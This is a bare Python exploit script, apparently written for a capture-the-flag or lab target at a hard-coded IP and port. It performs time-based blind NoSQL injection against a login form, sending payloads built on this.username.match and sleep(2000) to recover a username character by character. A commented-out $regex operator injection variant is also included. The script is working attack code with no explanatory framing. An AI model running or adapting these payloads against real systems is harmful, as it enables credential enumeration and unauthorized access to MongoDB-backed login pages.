#!/usr/bin/env python3
import requests
from colorama import Fore, Back, Style
import urllib3
import string
import urllib
urllib3.disable_warnings()
from urllib.parse import quote_plus
user_name=""
password="123"
url="http://94.237.56.248:53180/login"
headers={'content-type': 'application/x-www-form-urlencoded'}
character_array = string.printable

while True:
    for character in character_array:
        if character not in ['*','+','.','?','|','&','$','\t','\n','\r','\x0b','\x0c','\\']:
            #payload='user=%s&pass[$regex]=^%s&' % (username, password + c)
            payload='username=\" || (this.username.match(\'^%s.*$\')) || sleep(2000) || \"\"==\"&password=abc' % (user_name + character)
            #print("payload is:", payload)
            r = requests.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 200 and r.elapsed.total_seconds() < 2:
                print(Fore.GREEN + "Found one more char : %s" % (character))
                user_name += character
                print(Fore.CYAN + "Current var is:", user_name)

